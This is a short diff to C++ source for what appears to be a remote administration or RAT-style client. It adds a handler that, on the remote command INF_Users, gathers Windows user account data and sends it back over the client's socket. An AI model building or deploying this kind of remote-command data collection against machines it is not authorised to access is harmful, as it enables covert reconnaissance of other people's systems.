@@ -867,6 +867,20 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         }
         return;
     }
+
+    //Enviar datos de usuarios de windows
+    if (iComando == EnumComandos::INF_Users) {
+        if (this->mod_Inf0 == nullptr) {
+            this->mod_Inf0 = new mod_Info();
+        }
+        std::string strPaquete = this->mod_Inf0->m_GetUsersData();
+        if (strPaquete.size() > 6) {
+            this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr, EnumComandos::INF_Users);
+        }else {
+            this->cChunkSend(this->sckSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, true, nullptr, EnumComandos::INF_Error);
+        }
+        return;
+    }
 }
 
 void Cliente::Procesar_Paquete(const Paquete& paquete) {
